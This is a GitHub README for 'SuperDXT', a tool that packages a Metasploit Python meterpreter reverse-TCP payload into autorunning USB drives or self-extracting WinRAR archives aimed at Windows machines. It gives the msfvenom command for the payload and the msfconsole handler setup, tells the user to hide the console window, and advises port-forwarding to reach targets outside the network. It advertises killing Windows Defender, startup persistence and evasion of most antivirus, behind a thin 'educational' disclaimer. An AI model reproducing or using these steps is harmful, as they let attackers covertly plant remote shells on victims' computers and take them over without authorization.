
<h1 align="center">SuperDXT v1.0</h1>
<p align="center">
  <img src="https://img.shields.io/badge/Version-1.0-green?style=for-the-badge">
  <br>
  <br>
  <img src="https://img.shields.io/badge/Author-AbdulazizDXT-green?style=flat-square">
  <img src="https://img.shields.io/badge/Made%20in-Oman-green?style=flat-square">
  <img src="https://img.shields.io/badge/Powerd%20BY-Python%20&%20Metasploit-green?style=flat-square">
</p>

## [√] Description :

***The best tool to create a USB gadget or a zip file infested with a virus with a quick kill protection with Metasploit!***

## [+] Installation

##### The SuperDXT project is set up first in Kali Linux, and then the virus boot is set up in Windows :

* You can set up the project initially in Termux, but the remaining steps in preparing a zip file or creating a boot disk require Windows.

 - For KALI Linux :
    - ```git clone https://github.com/AbdulazizDXT/SuperDXT```
    - ```cd SuperDXT```
    - ```chmod +x install.sh```
    - ```./install.sh```

#### Or, directly run :
```
git clone https://github.com/AbdulazizDXT/SuperDXT ;cd SuperDXT ;chmod +x install.sh ;./install.sh

```
## [+] Usage

1. Run the script
2. SuperDXT file window will open automatically after installation 
3. Open Terminal and Type "msfvenom -p python/meterpreter/reverse_tcp LHOST={YourIPAddres} LPORT={Your Port} -o Update.py
4. ReName file --> "Update.py" to "Update.pyw" For hide python console
5. Copy the Update.pyw file to the Open SuperDXT window and click Replace
6. Now the file must be transferred to the Windows system to start creating an exe file for the virus in the USB or zip files

- In case you encounter a problem that Kali Linux is unable to open the working file window, you can easily go to the path you downloaded the project to such as: ``` home/kali/Desktop/SuperDXT/SuperDXT-PROJ ``` (The SuperDXT-PROJ file that transmits the python virus to it, which was created by metasploit)

- If you want to test the penetration outside the network, you must open a port for the IP address of your device and also put the IPv4 address and the port that you opened in step 3.  You want to receive the connection be the same port you set. IPv4 Outside Network Here : https://whatismyipaddress.com/

## [+] Use SuperDXT In USB Drive (AutoRun) :

1. Just copy all the contents of "SuperDXT-PROJ" after preparing it for hacking to the portable disk, but do not re-install the disk after disconnecting it from the device, because the payload will run automatically.

## [+]  Use SuperDXT In Zip File AutoRun :

1. Download WinRAR From : https://www.win-rar.com/download.html?&L=0
2. Install & Check [√]
3. Go to the SuperDXT file and then right click and click on Add to archive &  Click OK to start pressing... 
4. After compressing the file, open it, then choose the "SFX" option, then "Advanced SFX Option" & Setup Option
5. Type "MIN.exe" & Press OK & OK to Exit
6. Now you can use zip file for hacking / Do not try on your device

## [+] How to Connect Virus/Payload :

- You must have a metasploit formwork with you (Kali/Ubuntu/Fedora/Termux...)
 * Open Terminal/Termux
```
msfconsole

use exploit/multi/handler

set payload python/meterpreter/reverse_tcp 

set LHOST <YourIPAddres>

set LPORT <YourPort>

exploit

```
- Now you can use a USB or ZIP to hack and receive the connection from the Metasploit tool

## [√] Features:

 - Under 10s to install payload in target device
 - connect Metasploit to hacking
 - Python Quiet install
 - autorun payload in startup windows
 - kill windows defender forever
 - {5 security vendors and no sandboxes flagged this file as malicious} in ViursTotal <57/5>
 - This is the antivirus that detected the virus {Antiy-AVL, GData, Microsoft, ClamAV ,Ikarus}
 - Soon a copy will be released that disables all antivirus programs!

## [+] Something very important!

- This tool is developed for educational purposes. Here he explains how hacking works. If anyone wants to gain unauthorized access to someone's devices, they can try it at their own risk. You have your own responsibilities and you are responsible for any damage or violation of laws by this tool. The author is not responsible for any misuse of SuperDXT!
 
## [+] I'm Here!


- [![Github](https://img.shields.io/badge/Github-AbdulazizDXT-green?style=for-the-badge&logo=github)](https://github.com/AbdulazizDXT)

- [![Gmail](https://img.shields.io/badge/Gmail-AbdulazizDXT-green?style=for-the-badge&logo=gmail)](mailto:Abdulazizalhasaniwin@gmail.com)

